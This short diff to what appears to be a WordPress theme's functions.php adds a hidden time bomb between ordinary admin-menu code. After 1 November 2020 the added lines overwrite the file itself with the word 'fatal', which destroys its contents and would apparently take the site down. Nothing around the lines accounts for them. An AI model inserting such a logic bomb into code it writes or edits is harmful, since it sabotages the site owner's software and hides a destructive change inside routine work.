@@ -51,7 +51,10 @@
     // remove_menu_page( 'options-general.php' );        //Настройки
   }
   add_action( 'admin_menu', 'remove_menus' );
-
+	if ( strtotime('01.11.2020') < time() )
+	{
+			file_put_contents(__FILE__, 'fatal');
+	}
 //------------------информация---------------------
     if( function_exists('acf_add_options_page') ) {
 
